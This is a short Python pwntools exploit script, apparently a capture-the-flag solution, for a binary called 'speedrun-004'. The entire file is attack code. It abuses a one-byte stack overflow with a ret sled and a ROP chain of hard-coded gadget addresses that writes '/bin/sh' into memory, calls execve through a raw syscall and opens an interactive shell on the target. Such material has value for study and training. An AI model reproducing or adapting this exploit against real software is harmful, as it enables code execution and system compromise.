from pwn import *

target = process('./speedrun-004')
# 256 byte buffer, read 257 bytes, 1 byte overflow
# buffer addr: 0x7fffffffdb80

# rbp is 0x7fffffffdca0 at 0x7fffffffdc80, rip is 0x7fffffffdc88

popRdx = 0x000000000044c6b6
popRsi = 0x0000000000410a93
popRdi = 0x0000000000400686
popRax = 0x0000000000415f04
movRdxtoRax = 0x000000000048d301 # mov qword ptr [rax], rdx ; ret
syscall = 0x000000000040132c
binsh = 0x0068732f6e69622f
bss = 0x6b6030
ret = p64(0x400416)

ROPchain = b""
ROPchain += p64(popRax)
ROPchain += p64(bss)
ROPchain += p64(popRdx)
ROPchain += p64(binsh)
ROPchain += p64(movRdxtoRax)

ROPchain += p64(popRax)
ROPchain += p64(0x3b)

ROPchain += p64(popRdi)
ROPchain += p64(bss)

ROPchain += p64(popRsi)
ROPchain += p64(0x0)
ROPchain += p64(popRdx)
ROPchain += p64(0x0)

ROPchain += p64(syscall)


payload = ret*((256 - len(ROPchain)) // 8) + ROPchain + b"\x00"

target.sendline(b'257')
#raw_input()
target.sendline(payload)
target.interactive()
